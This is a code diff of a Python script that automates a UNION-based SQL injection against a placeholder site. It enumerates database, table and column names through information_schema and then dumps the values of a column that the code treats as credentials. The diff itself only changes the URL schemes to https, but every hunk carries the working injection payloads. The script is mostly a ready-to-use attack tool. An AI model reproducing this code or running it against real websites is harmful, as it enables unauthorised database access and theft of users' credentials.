@@ -3,7 +3,7 @@ import bs4
 
 
 def fetchDatabaseCount():
-    url = "www.example.com' and 0 union select 1,2,3,4,count(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata-- -"
+    url = "https://www.example.com' and 0 union select 1,2,3,4,count(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata-- -"
     response = requests.get(url)
     soup = bs4.BeautifulSoup(response.text, "html.parser")
     temp = soup.find(
@@ -28,7 +28,7 @@ databasename = []
 def fetchDatabaseName():
     for name in range(1, int(variable) + 1):
         url = (
-            "http:www.example.com' and 0 union select 1,2,3,4,schema_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata limit "
+            "https://www.example.com' and 0 union select 1,2,3,4,schema_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.schemata limit "
             + str(name)
             + "-- -"
         )
@@ -54,7 +54,7 @@ print(databasename)
 
 def tablecount():
     url = (
-        "http://www.example.com' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
+        "https://www.example.com' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
         + databasename
         + "'-- -"
     )
@@ -82,7 +82,7 @@ tablename = []
 def fetchtablename():
     for table in range(1, int(y) + 1):
         url = (
-            "http:www.example.com' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
+            "https://www.example.com' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema='"
             + databasename
             + "' limit "
             + str(table)
@@ -112,7 +112,7 @@ print(tablename)
 
 def fetchcolumncount():
     url = (
-        "http://www.example.com' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
+        "https://www.example.com' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
         + databasename
         + "'-- -"
     )
@@ -137,7 +137,7 @@ columnname = []
 def fetchcolumnaname():
     for column in range(1, int(z) + 1):
         url = (
-            "http:www.example.com' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
+            "https://www.example.com' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema= '"
             + databasename
             + "'  and table_name = '"
             + tablename
@@ -168,7 +168,7 @@ print(columnname)
 
 def credentialscount():
     url = (
-        "http://www.example.com' and 0 union select 1,2,3,4,count("
+        "https://www.example.com' and 0 union select 1,2,3,4,count("
         + columnname
         + "),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
         + tablename
@@ -197,7 +197,7 @@ cred = []
 def datas():
     for fuck in range(1, int(c) + 1):
         url = (
-            "http://www.example.com' and 0 union select 1,2,3,4,"
+            "https://www.example.com' and 0 union select 1,2,3,4,"
             + columnname
             + ",6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
             + tablename
